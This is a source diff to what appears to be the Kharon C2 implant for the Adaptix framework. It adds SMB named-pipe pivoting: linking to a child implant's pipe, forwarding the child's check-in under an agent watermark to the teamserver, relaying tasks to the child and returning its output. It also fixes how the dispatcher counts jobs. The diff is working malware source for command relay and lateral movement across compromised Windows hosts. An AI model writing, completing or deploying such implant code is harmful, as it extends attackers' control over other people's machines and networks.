@@ -15,7 +15,23 @@ auto DECLFN Task::Dispatcher( VOID ) -> VOID {
     ULONG    TaskQtt  = 0;
 
     auto FinalRoutine = [&]( VOID ) {
-        if ( Self->Jbs->ExecuteAll() ) {
+        Self->Jbs->QuickCount = 0;
+        LONG ExecResult = Self->Jbs->ExecuteAll();
+        if ( ExecResult ) {
+            // Update taskCount in PostJobs if QuickMsg entries were added during ExecuteAll
+            if ( Self->Jbs->QuickCount > 0 && Self->Jbs->PostJobs ) {
+                UCHAR* CountPos = UC_PTR( Self->Jbs->PostJobs->Buffer ) + Self->Jbs->PostJobsCountPos;
+                ULONG  OldCount = ( (ULONG)CountPos[0] << 24 ) | ( (ULONG)CountPos[1] << 16 ) |
+                                  ( (ULONG)CountPos[2] << 8  ) |   (ULONG)CountPos[3];
+                ULONG  NewCount = OldCount + Self->Jbs->QuickCount;
+                CountPos[0] = ( NewCount >> 24 ) & 0xFF;
+                CountPos[1] = ( NewCount >> 16 ) & 0xFF;
+                CountPos[2] = ( NewCount >> 8  ) & 0xFF;
+                CountPos[3] =   NewCount         & 0xFF;
+            }
+            Self->Jbs->Send( Self->Jbs->PostJobs );
+        } else if ( Self->Tsp->Pipe.Name ) {
+            // SMB: must always send PostJobs to close the pipe from Call 1
             Self->Jbs->Send( Self->Jbs->PostJobs );
         }
 
@@ -62,6 +78,7 @@ auto DECLFN Task::Dispatcher( VOID ) -> VOID {
     Self->Pkg->Transmit( Package, &DataPsr, &PsrLen );
 
     if ( ! DataPsr || ! PsrLen ) {
+        Self->Jbs->PostJobsCountPos = Self->Jbs->PostJobs->Length;
         Self->Pkg->Int32( Self->Jbs->PostJobs, Self->Jbs->Count );
         KhDbg("Not received task");
         return FinalRoutine();
@@ -87,6 +104,7 @@ auto DECLFN Task::Dispatcher( VOID ) -> VOID {
                 return FinalRoutine();
             }
  
+            Self->Jbs->PostJobsCountPos = Self->Jbs->PostJobs->Length;
             Self->Pkg->Int32( Self->Jbs->PostJobs, TaskQtt + Self->Jbs->Count );
 
             for ( ULONG i = 0; i < TaskQtt; i++ ) {
@@ -109,6 +127,7 @@ auto DECLFN Task::Dispatcher( VOID ) -> VOID {
                 }
             }
         } else {
+            Self->Jbs->PostJobsCountPos = Self->Jbs->PostJobs->Length;
             Self->Pkg->Int32( Self->Jbs->PostJobs, Self->Jbs->Count );
         }
     }
@@ -715,17 +734,189 @@ auto DECLFN Task::Pivot(
     Self->Pkg->Byte( Package, SubCmd );    
 
     switch ( (Action::Pivot)SubCmd ) {
-        case Action::Pivot::List: {
-
-        }
         case Action::Pivot::Link: {
+            PCHAR PipePath = Self->Psr->Str( Parser, 0 );
+            if ( ! PipePath ) {
+                Self->Ntdll.DbgPrint( "[PIVOT] Link: no pipe path\n" );
+                Self->Pkg->Str( Package, (PCHAR)"link: no pipe path" );
+                KhSetError( ERROR_INVALID_PARAMETER );
+                break;
+            }
 
+            Self->Ntdll.DbgPrint( "[PIVOT] Link: connecting to %s\n", PipePath );
+
+            // Connect to the child's named pipe and read its checkin data
+            SMB_PROFILE_DATA* SmbNode = (SMB_PROFILE_DATA*)Self->Tsp->SmbAdd( PipePath, Parser, Package );
+            if ( ! SmbNode ) {
+                ULONG err = KhGetError;
+                Self->Ntdll.DbgPrint( "[PIVOT] Link: SmbAdd failed, error=%d\n", err );
+
+                // Report failure to operator via task output
+                CHAR errMsg[128] = { 0 };
+                Self->Msvcrt.k_vswprintf; // ensure msvcrt is loaded
+                // Build error string manually
+                PCHAR p = errMsg;
+                PCHAR prefix = (PCHAR)"link failed: CreateFileA error=";
+                while ( *prefix ) *p++ = *prefix++;
+                // Convert error code to decimal
+                ULONG tmp = err;
+                CHAR numBuf[12] = { 0 };
+                INT idx = 0;
+                if ( tmp == 0 ) { numBuf[idx++] = '0'; }
+                else { while ( tmp > 0 ) { numBuf[idx++] = '0' + (tmp % 10); tmp /= 10; } }
+                for ( INT i = idx - 1; i >= 0; i-- ) *p++ = numBuf[i];
+                *p = 0;
+
+                Self->Pkg->Str( Package, errMsg );
+                KhSetError( ERROR_PIPE_NOT_CONNECTED );
+                break;
+            }
+
+            Self->Ntdll.DbgPrint( "[PIVOT] Link: connected, child UUID=%s, data=%d bytes\n",
+                SmbNode->SmbUUID, SmbNode->Pkg->Length );
+
+            // Forward child's checkin blob to teamserver
+            // Format matches Adaptix COMMAND_LINK: [byte linkType][int32 watermark][bytes beat]
+            Self->Pkg->Int32( Package, (UINT32)0xc17a905a );  // Kharon agent watermark
+            Self->Pkg->Bytes( Package, (PBYTE)SmbNode->Pkg->Buffer, SmbNode->Pkg->Length );
+
+            Self->Ntdll.DbgPrint( "[PIVOT] Link: forwarded %d bytes with watermark\n", SmbNode->Pkg->Length );
+            break;
         }
         case Action::Pivot::Unlink: {
+            PCHAR ChildUUID = Self->Psr->Str( Parser, 0 );
+            if ( ! ChildUUID ) {
+                KhSetError( ERROR_INVALID_PARAMETER );
+                break;
+            }
 
+            Self->Ntdll.DbgPrint( "[PIVOT] Unlink: removing %s\n", ChildUUID );
+
+            PVOID SmbNode = Self->Tsp->SmbGet( ChildUUID );
+            if ( SmbNode ) {
+                Self->Tsp->SmbRm( SmbNode );
+                Self->Ntdll.DbgPrint( "[PIVOT] Unlink: removed\n" );
+            }
+            break;
+        }
+        case Action::Pivot::List: {
+            break;
+        }
+        case Action::Pivot::Exchange: {
+            // Relay task data to SMB child and read response
+            PCHAR PivotId = Self->Psr->Str( Parser, 0 );
+            ULONG DataLen = 0;
+            PBYTE Data    = Self->Psr->Bytes( Parser, &DataLen );
+
+            if ( ! PivotId || ! Data || DataLen == 0 ) {
+                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: missing pivotId or data\n" );
+                break;
+            }
+
+            Self->Ntdll.DbgPrint( "[PIVOT] Exchange: pivotId=%s, data=%d bytes\n", PivotId, DataLen );
+
+            // Get child from the SMB linked list
+            SMB_PROFILE_DATA* Child = (SMB_PROFILE_DATA*)Self->Tsp->SmbList();
+            if ( ! Child || ! Child->PipePath ) {
+                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: no connected child\n" );
+                break;
+            }
+
+            // Close old handle — child closes its pipe after each exchange and recreates it
+            if ( Child->Handle ) {
+                Self->Ntdll.NtClose( Child->Handle );
+                Child->Handle = nullptr;
+            }
+
+            // Connect to child's NEW pipe (child is waiting on ConnectNamedPipe)
+            Self->Ntdll.DbgPrint( "[PIVOT] Exchange: connecting to %s\n", Child->PipePath );
+
+            HANDLE hPipe = Self->Krnl32.CreateFileA(
+                Child->PipePath,
+                GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr
+            );
+
+            if ( hPipe == INVALID_HANDLE_VALUE || ! hPipe ) {
+                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: CreateFileA failed: %d\n", KhGetError );
+                break;
+            }
+
+            Child->Handle = hPipe;
+
+            // Write [4B len][data] as SINGLE message for PIPE_TYPE_MESSAGE
+            ULONG TotalWriteLen = sizeof(ULONG) + DataLen;
+            PBYTE WriteBuf = (PBYTE)KhAlloc( TotalWriteLen );
+            if ( ! WriteBuf ) {
+                Self->Ntdll.NtClose( hPipe );
+                Child->Handle = nullptr;
+                break;
+            }
+            Mem::Copy( WriteBuf, &DataLen, sizeof(ULONG) );
+            Mem::Copy( WriteBuf + sizeof(ULONG), Data, DataLen );
+            ULONG WriteLen = 0;
+            BOOL writeOk = Self->Krnl32.WriteFile( hPipe, WriteBuf, TotalWriteLen, &WriteLen, nullptr );
+            KhFree( WriteBuf );
+            if ( ! writeOk ) {
+                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: WriteFile failed: %d\n", KhGetError );
+                Self->Ntdll.NtClose( hPipe );
+                Child->Handle = nullptr;
+                break;
+            }
+
+            Self->Ntdll.DbgPrint( "[PIVOT] Exchange: wrote %d bytes tasks to child\n", DataLen );
+
+            // Step 2: Read child's results [4B len][response]
+            // Wait for child to process and write back
+            ULONG PeekLen = 0;
+            ULONG retries = 0;
+            while ( retries < 100 ) {
+                if ( Self->Krnl32.PeekNamedPipe( hPipe, nullptr, 0, 0, &PeekLen, 0 ) && PeekLen >= 4 ) {
+                    break;
+                }
+                Self->Krnl32.Sleep( 100 );
+                retries++;
+            }
+
+            PBYTE RespBuf = nullptr;
+            ULONG RespLen = 0;
+
+            if ( PeekLen >= 4 ) {
+                // Read entire message at once (PIPE_TYPE_MESSAGE)
+                PBYTE MsgBuf = (PBYTE)KhAlloc( PeekLen );
+                ULONG ReadLen = 0;
+                Self->Krnl32.ReadFile( hPipe, MsgBuf, PeekLen, &ReadLen, nullptr );
+
+                // Extract payload: skip 4-byte length prefix
+                if ( ReadLen > sizeof(ULONG) ) {
+                    RespLen = ReadLen - sizeof(ULONG);
+                    RespBuf = (PBYTE)KhAlloc( RespLen );
+                    Mem::Copy( RespBuf, MsgBuf + sizeof(ULONG), RespLen );
+                }
+                KhFree( MsgBuf );
+
+                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: child response = %d bytes\n", RespLen );
+            } else {
+                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: timeout waiting for child response\n" );
+            }
+
+            // Close pipe
+            Self->Ntdll.NtClose( hPipe );
+            Child->Handle = nullptr;
+
+            // Package child response for teamserver
+            if ( RespBuf && RespLen > 0 ) {
+                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: Package before: buf=%p len=%d\n", Package->Buffer, Package->Length );
+                Self->Pkg->Int32( Package, PROFILE_SMB );
+                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: after Int32: buf=%p len=%d\n", Package->Buffer, Package->Length );
+                Self->Pkg->Bytes( Package, RespBuf, RespLen );
+                Self->Ntdll.DbgPrint( "[PIVOT] Exchange: after Bytes: buf=%p len=%d (resp=%d)\n", Package->Buffer, Package->Length, RespLen );
+                KhFree( RespBuf );
+            }
+
+            break;
         }
     }
-    
+
     return KhRetSuccess;
 }
 
